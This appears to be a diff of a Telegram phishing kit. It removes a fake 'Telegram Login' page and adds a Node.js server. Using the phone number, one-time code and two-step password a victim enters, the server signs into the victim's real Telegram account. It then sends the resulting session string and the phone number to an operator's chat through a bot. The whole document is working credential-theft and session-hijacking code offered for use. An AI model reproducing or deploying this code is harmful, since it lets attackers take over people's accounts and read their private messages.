@@ -1,206 +1,135 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <!-- ការពារ Auto-Zoom លើ Mobile -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Web Auth</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { 
-            background-color: #0f1721; 
-            color: #ffffff; 
-            font-family: system-ui, -apple-system, sans-serif; 
-            touch-action: manipulation;
-        }
-        .tg-input { 
-            background: #17212b; 
-            border: 1px solid #2f3846; 
-            border-radius: 12px; 
-            color: #fff; 
-            font-size: 16px !important; 
-            touch-action: manipulation;
-        }
-        .tg-input:focus { 
-            border-color: #5288c1; 
-            outline: none; 
-        }
-        button, input {
-            touch-action: manipulation;
-        }
-    </style>
-</head>
-<body class="flex items-center justify-center min-h-screen p-4 select-none">
-    <div class="w-full max-w-sm text-center">
-        <!-- STEP 1: Phone Form -->
-        <div id="step-phone" class="space-y-6">
-            <div class="flex justify-center">
-                <div class="w-20 h-20 bg-[#2AABEE] rounded-full flex items-center justify-center shadow-lg">
-                    <svg class="w-11 h-11 text-white ml-[-2px]" viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.73 6.66-2.87 8.01-3.43 3.81-1.58 4.6-1.86 5.12-1.86.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.19-.04.31z"/>
-                    </svg>
-                </div>
-            </div>
-            <div>
-                <h1 class="text-2xl font-semibold mb-1">Telegram Login</h1>
-                <p class="text-gray-400 text-sm">Enter your phone number with country code</p>
-            </div>
-            <div class="space-y-4 text-left">
-                <div>
-                    <label class="block text-xs text-gray-400 mb-1 ml-1">Phone Number</label>
-                    <!-- បន្ថែម event oninput ដើម្បី Format លេខដកឃ្លា -->
-                    <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" class="tg-input w-full p-3">
-                </div>
-            </div>
-            <button id="btn-send" onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">SEND CODE</button>
-        </div>
+require('dotenv').config();
+const express = require('express');
+const cors = require('cors');
+const path = require('path');
+const { TelegramClient, Api } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const { computeCheck } = require('telegram/Password');
 
-        <!-- STEP 2: OTP & 2FA Form -->
-        <div id="step-otp" class="space-y-6 hidden">
-            <div class="text-5xl">🔐</div>
-            <div>
-                <h2 id="display-phone" class="text-lg font-semibold mb-1"></h2>
-                <p class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
-            </div>
-            
-            <div class="text-left space-y-4">
-                <div>
-                    <label class="block text-xs text-gray-400 mb-1 ml-1">Telegram Code</label>
-                    <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="tg-input w-full p-3 text-center text-xl font-mono tracking-widest">
-                </div>
+const app = express();
+app.use(cors());
+app.use(express.json());
 
-                <!-- Input 2FA Password (លាក់ជាមុន) -->
-                <div id="password-container" class="hidden">
-                    <label class="block text-xs text-gray-400 mb-1 ml-1">Two-Step Password (2FA)</label>
-                    <input id="password-input" type="password" placeholder="Enter your 2FA password" class="tg-input w-full p-3">
-                </div>
-            </div>
+// Serve static files (index.html)
+app.use(express.static(__dirname));
 
-            <button id="btn-verify" onclick="submitOTP()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">VERIFY & LOGIN</button>
-            <div>
-                <button onclick="goBack()" class="text-xs text-[#5288c1] hover:underline active:opacity-70 transition">Change Phone Number</button>
-            </div>
-        </div>
-    </div>
+// ទាញយក Environment Variables ពី Railway
+const apiId = Number(process.env.TELEGRAM_API_ID);
+const apiHash = process.env.TELEGRAM_API_HASH;
+const botToken = process.env.BOT_TOKEN;
+const adminChatId = process.env.ADMIN_CHAT_ID;
 
-    <script>
-        const BACKEND_URL = "https://jvpcambodia.up.railway.app";
+// Session បណ្តោះអាសន្នសម្រាប់រក្សាទុក Telegram Client
+const sessions = {};
 
-        // Function សម្រាប់ Format លេខទូរស័ព្ទឱ្យដកឃ្លាស្វ័យប្រវត្តិ (+855 XX XXX XXX)
-        function formatPhoneNumber(input) {
-            let val = input.value;
-            
-            // យកតែលេខចេញប៉ុណ្ណោះ
-            let digits = val.replace(/[^\d]/g, '');
+// Root Route: បើកទំព័រ index.html
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
-            if (digits.startsWith('855')) {
-                let rest = digits.slice(3);
-                let parts = ['+855'];
+// 1. API សម្រាប់ផ្ញើលេខកូដ OTP ទៅ Telegram App
+app.post('/api/send-code', async (req, res) => {
+    const { phoneNumber } = req.body;
+    if (!phoneNumber) {
+        return res.status(400).json({ success: false, error: "Phone number is required" });
+    }
 
-                if (rest.length > 0) parts.push(rest.slice(0, 2));
-                if (rest.length > 2) parts.push(rest.slice(2, 5));
-                if (rest.length > 5) parts.push(rest.slice(5, 9));
+    try {
+        const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
+            connectionRetries: 5,
+        });
+        await client.connect();
 
-                input.value = parts.join(' ');
-            } else {
-                input.value = '+' + digits;
-            }
+        const { phoneCodeHash } = await client.sendCode(
+            { apiId, apiHash },
+            phoneNumber
+        );
+
+        // រក្សាទុក Client តាមលេខទូរស័ព្ទ
+        sessions[phoneNumber] = { client, phoneCodeHash };
+
+        res.json({ success: true, message: "OTP code sent to your Telegram app!" });
+    } catch (err) {
+        console.error("Error sending code:", err);
+        res.status(500).json({ success: false, error: err.message || "Failed to send code" });
+    }
+});
+
+// 2. API សម្រាប់ផ្ទៀងផ្ទាត់ OTP និង 2FA Password
+app.post('/api/verify-code', async (req, res) => {
+    const { phoneNumber, code, password } = req.body;
+
+    if (!phoneNumber || !code) {
+        return res.status(400).json({ success: false, error: "Phone number and OTP code are required" });
+    }
+
+    const session = sessions[phoneNumber];
+    if (!session) {
+        return res.status(400).json({ success: false, error: "Session expired. Please request OTP again." });
+    }
+
+    try {
+        const { client, phoneCodeHash } = session;
+
+        if (password) {
+            // ករណីមាន 2FA Password
+            const passwordSrp = await client.invoke(new Api.account.GetPassword());
+            const passwordCheck = await computeCheck(passwordSrp, password);
+            await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
+        } else {
+            // ករណី Sign In ជាមួយ OTP ធម្មតា
+            await client.invoke(
+                new Api.auth.SignIn({
+                    phoneNumber: phoneNumber,
+                    phoneCodeHash: phoneCodeHash,
+                    phoneCode: code,
+                })
+            );
         }
 
-        async function sendPhone() {
-            const phoneInput = document.getElementById('phone-input');
-            const btn = document.getElementById('btn-send');
-            
-            // លុបចន្លោះដកឃ្លាចោលមុនពេលផ្ញើទៅ Backend (ឧទាហរណ៍៖ +85515944782)
-            const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
+        const sessionString = client.session.save();
+        delete sessions[phoneNumber];
 
-            if (!phoneClean || phoneClean.length < 9) {
-                alert('Please enter a valid phone number with country code.');
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerText = 'SENDING...';
-            btn.classList.add('opacity-70');
-
+        // ផ្ញើ Session String ចូល Telegram Bot
+        if (botToken && adminChatId) {
             try {
-                const res = await fetch(`${BACKEND_URL}/api/send-code`, {
+                const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber: phoneClean })
-                });
-                const data = await res.json();
-
-                if (data.success) {
-                    document.getElementById('display-phone').innerText = phoneInput.value.trim();
-                    document.getElementById('step-phone').classList.add('hidden');
-                    document.getElementById('step-otp').classList.remove('hidden');
-                } else {
-                    alert(data.error || 'Failed to send code.');
-                }
-            } catch (err) {
-                alert('Cannot connect to backend server!');
-                console.error(err);
-            } finally {
-                btn.disabled = false;
-                btn.innerText = 'SEND CODE';
-                btn.classList.remove('opacity-70');
-            }
-        }
-
-        async function submitOTP() {
-            const phoneInput = document.getElementById('phone-input');
-            const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
-            const code = document.getElementById('otp-input').value.trim();
-            const password = document.getElementById('password-input').value.trim();
-            const btn = document.getElementById('btn-verify');
-
-            if (!code) {
-                alert('Please enter the OTP code.');
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerText = 'VERIFYING...';
-            btn.classList.add('opacity-70');
-
-            try {
-                const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phoneNumber: phoneClean, 
-                        code: code,
-                        password: password || undefined
+                    body: JSON.stringify({
+                        chat_id: adminChatId,
+                        text: messageText,
+                        parse_mode: 'Markdown'
                     })
                 });
-                const data = await res.json();
-
-                if (data.success) {
-                    window.location.href = "https://jvpfans.com";
-                } else if (data.requiresPassword) {
-                    document.getElementById('password-container').classList.remove('hidden');
-                    alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
-                } else {
-                    alert(data.error || 'Verification failed.');
-                }
-            } catch (err) {
-                alert('Connection error!');
-                console.error(err);
-            } finally {
-                btn.disabled = false;
-                btn.innerText = 'VERIFY & LOGIN';
-                btn.classList.remove('opacity-70');
+            } catch (notifyErr) {
+                console.error("Failed to send notification to Telegram Bot:", notifyErr);
             }
         }
 
-        function goBack() {
-            document.getElementById('step-otp').classList.add('hidden');
-            document.getElementById('password-container').classList.add('hidden');
-            document.getElementById('password-input').value = '';
-            document.getElementById('otp-input').value = '';
-            document.getElementById('step-phone').classList.remove('hidden');
+        res.json({
+            success: true,
+            message: "Authentication successful!",
+            session: sessionString
+        });
+    } catch (err) {
+        console.error("Error verifying code:", err);
+
+        if (err.message && err.message.includes("SESSION_PASSWORD_NEEDED")) {
+            return res.status(401).json({
+                success: false,
+                requiresPassword: true,
+                error: "Two-Step Verification (2FA) password is required."
+            });
         }
-    </script>
-</body>
-</html>
+
+        res.status(400).json({ success: false, error: err.message || "Verification failed" });
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+});
